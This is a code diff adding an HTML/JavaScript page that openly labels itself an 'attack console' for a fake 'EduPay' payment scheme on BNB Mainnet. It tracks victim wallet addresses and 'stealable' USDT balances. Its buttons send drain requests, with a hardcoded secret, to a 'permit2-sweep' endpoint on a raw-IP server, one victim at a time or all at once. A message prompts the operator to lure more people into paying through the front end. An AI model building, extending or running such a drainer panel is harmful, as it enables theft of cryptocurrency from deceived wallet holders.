@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EduPay 控制台</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", monospace;
+      background: #0b0e14; color: #e0e4ec; padding: 24px; min-height: 100vh;
+    }
+    h1 { font-size: 22px; margin-bottom: 6px; }
+    .sub { color: #6b7280; font-size: 13px; margin-bottom: 24px; }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 14px; margin-bottom: 24px; }
+    .stat {
+      background: rgba(22,25,36,0.9); border: 1px solid rgba(115,128,155,0.2);
+      border-radius: 12px; padding: 18px 20px;
+    }
+    .stat .label { font-size: 12px; color: #7f889b; }
+    .stat .value { font-size: 28px; font-weight: 700; margin-top: 6px; }
+    .stat .value.green { color: #32d583; }
+    .stat .value.red { color: #ff5f6d; }
+    .stat .value.blue { color: #4f7cff; }
+    .stat .value.yellow { color: #f7b955; }
+    .toolbar { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; align-items: center; }
+    .btn {
+      padding: 10px 18px; border-radius: 8px; border: 1px solid rgba(115,128,155,0.3);
+      background: rgba(22,25,36,0.9); color: #c2c9d6; cursor: pointer;
+      font-size: 13px; font-weight: 600; transition: 0.15s;
+    }
+    .btn:hover { background: rgba(43,49,64,0.96); border-color: rgba(106,167,255,0.5); }
+    .btn.primary { background: rgba(79,124,255,0.2); border-color: rgba(79,124,255,0.5); color: #6aa7ff; }
+    .btn.success { background: rgba(50,213,131,0.15); border-color: rgba(50,213,131,0.4); color: #32d583; }
+    .btn.danger { background: rgba(255,95,109,0.15); border-color: rgba(255,95,109,0.4); color: #ff5f6d; }
+    .btn.danger:hover { background: rgba(255,95,109,0.25); }
+    .btn.sweep-btn { background: rgba(50,213,131,0.12); border-color: #32d583; color: #32d583; padding: 6px 14px; font-size: 12px; font-weight: 700; }
+    .btn.sweep-btn:hover { background: rgba(50,213,131,0.25); }
+    .btn.sweep-btn:disabled { opacity: 0.3; cursor: not-allowed; border-color: #555; color: #555; }
+    table { width: 100%; border-collapse: separate; border-spacing: 0; }
+    th, td { padding: 12px 14px; text-align: left; font-size: 13px; }
+    th { color: #7f889b; font-weight: 600; border-bottom: 1px solid rgba(115,128,155,0.2); position: sticky; top: 0; background: #0b0e14; }
+    td { border-bottom: 1px solid rgba(115,128,155,0.08); }
+    tr:hover td { background: rgba(255,255,255,0.02); }
+    .addr { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
+    .badge { display: inline-block; padding: 3px 10px; border-radius: 99px; font-size: 11px; font-weight: 700; }
+    .badge.ready { background: rgba(50,213,131,0.15); color: #32d583; }
+    .badge.swept { background: rgba(107,114,128,0.15); color: #7f889b; }
+    .badge.pending { background: rgba(240,185,11,0.15); color: #f7b955; }
+    .badge.new { background: rgba(79,124,255,0.15); color: #4f7cff; }
+    .empty { text-align: center; color: #6b7280; padding: 40px; }
+    .tx-hash { font-size: 10px; color: #6b7280; font-family: monospace; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <h1>EduPay 攻击控制台</h1>
+  <div class="sub">受害者授权管理 · 手动 Sweep 控制 · BNB Mainnet</div>
+
+  <div class="stats" id="stats"></div>
+
+  <div class="toolbar">
+    <button class="btn primary" onclick="loadData()">刷新数据</button>
+    <button class="btn success" onclick="sweepAll()">一键 Sweep 全部待收割</button>
+    <span style="font-size:12px;color:#6b7280;" id="lastUpdate"></span>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>受害者地址</th>
+        <th>USDT 余额</th>
+        <th>状态</th>
+        <th>存入时间</th>
+        <th>操作</th>
+      </tr>
+    </thead>
+    <tbody id="tbody"></tbody>
+  </table>
+  <div class="empty" id="empty">加载中...</div>
+
+  <script>
+    const API = "http://154.222.16.152:3999";
+    const SECRET = "edu-sweep-2026";
+
+    async function loadData() {
+      document.getElementById("empty").textContent = "加载中...";
+      try {
+        const r = await fetch(`${API}/monitor`);
+        const d = await r.json();
+        render(d);
+        document.getElementById("lastUpdate").textContent = "更新于 " + new Date().toLocaleTimeString();
+      } catch (e) {
+        document.getElementById("empty").textContent = "连接失败: " + e.message;
+      }
+    }
+
+    function render(d) {
+      document.getElementById("stats").innerHTML = `
+        <div class="stat"><div class="label">总授权数</div><div class="value blue">${d.totalVictims}</div></div>
+        <div class="stat"><div class="label">待收割</div><div class="value yellow">${d.pendingCount}</div></div>
+        <div class="stat"><div class="label">可 Sweep</div><div class="value green">${d.readyCount}</div></div>
+        <div class="stat"><div class="label">已 Swept</div><div class="value">${d.sweptCount}</div></div>
+        <div class="stat"><div class="label">可偷 USDT</div><div class="value red">${d.totalRemaining}</div></div>
+      `;
+
+      const tbody = document.getElementById("tbody");
+      if (!d.victims.length) {
+        tbody.innerHTML = "";
+        document.getElementById("empty").textContent = "暂无受害者，去前端引人来支付吧";
+        document.getElementById("empty").style.display = "block";
+        return;
+      }
+      document.getElementById("empty").style.display = "none";
+      tbody.innerHTML = d.victims.map(v => `
+        <tr>
+          <td><span class="addr">${v.address}</span>${v.drained ? `<br><span class="tx-hash">扫走: ${v.drained} USDT</span>` : ""}</td>
+          <td><b>${v.balance}</b> USDT</td>
+          <td><span class="badge ${v.status}">${
+            v.status === "ready" ? "就绪" : v.status === "swept" ? "已清空" : v.status === "new" ? "新发现" : "待收割"
+          }</span></td>
+          <td style="font-size:11px;color:#6b7280;">${v.storedAt ? v.storedAt.slice(11,19) : "-"}</td>
+          <td>
+            ${v.sweepable
+              ? `<button class="btn sweep-btn" onclick="sweepOne('${v.address}')">手动 Sweep</button>`
+              : (v.status === "swept" ? "✓ 已处理" : "-")}
+          </td>
+        </tr>
+      `).join("");
+    }
+
+    async function sweepOne(addr) {
+      const amt = prompt(`确认 sweep ${addr.slice(0,10)}... 输入 SWEEP 确认:`);
+      if (amt !== "SWEEP") return;
+      try {
+        const r = await fetch(`${API}/permit2-sweep`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ secret: SECRET, victim: addr }),
+        });
+        const d = await r.json();
+        if (d.ok) alert("已扫走 " + d.drained + " USDT\nTx: " + d.txHash);
+        else alert("失败: " + d.msg);
+        loadData();
+      } catch (e) { alert("请求失败: " + e.message); }
+    }
+
+    async function sweepAll() {
+      const r = await fetch(`${API}/monitor`);
+      const d = await r.json();
+      const ready = d.victims.filter(v => v.sweepable);
+      if (!ready.length) { alert("没有可 sweep 的地址"); return; }
+      if (!confirm(`确认 sweep ${ready.length} 个地址，共 ${d.totalRemaining} USDT ?`)) return;
+      let ok = 0, fail = 0;
+      for (const v of ready) {
+        try {
+          const rr = await fetch(`${API}/permit2-sweep`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ secret: SECRET, victim: v.address }),
+          });
+          const rd = await rr.json();
+          if (rd.ok) ok++; else fail++;
+        } catch (e) { fail++; }
+      }
+      alert(`完成: ${ok} 成功, ${fail} 失败`);
+      loadData();
+    }
+
+    loadData();
+    setInterval(loadData, 15000);
+  </script>
+</body>
+</html>
